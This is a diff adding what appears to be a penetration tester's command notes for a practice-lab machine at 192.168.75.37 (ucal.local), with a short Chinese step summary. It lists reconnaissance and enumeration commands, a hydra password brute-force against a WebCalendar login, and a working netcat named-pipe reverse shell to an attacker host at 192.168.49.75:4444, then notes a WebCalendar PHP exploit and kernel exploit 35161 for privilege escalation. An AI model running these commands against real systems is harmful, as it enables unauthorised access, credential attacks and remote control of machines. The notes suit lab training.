@@ -1,0 +1,26 @@
+nmap -sV -sC -Pn 192.168.75.37 > nmap.txt
+nmap -p- 192.168.75.37 > nmapall.txt
+
+
+dig axfr @192.168.75.37   ucal.local
+
+gobuster dir -u http://www.ucal.local/ -w /usr/share/dirb/wordlists/common.txt -x txt,php > gobuster.txt
+enum4linux ucal.local > enum4linun.txt
+/opt/ffuf/ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://www.ucal.local/ -H 'Host: FUZZ.ucal.local' -fs 20750
+
+snmpwalk -c public -v2c 192.168.75.37
+
+nmap --script vuln -sV -p 25,53,80,8290 -Pn  192.168.75.37  > nmapvuln.txt
+
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.75.37 http-post-form "/webcalendar/login.php:login=admin&password=^PASS^&remember=yes:Error"
+
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.49.75 4444 >/tmp/f
+
+
+
+
+
+1.nmap找到80port
+2.gobuster找到/webcalendar服務
+3.根據webcalendar找到漏洞php腳本取得shell
+4.根據內核版本找到漏洞35161
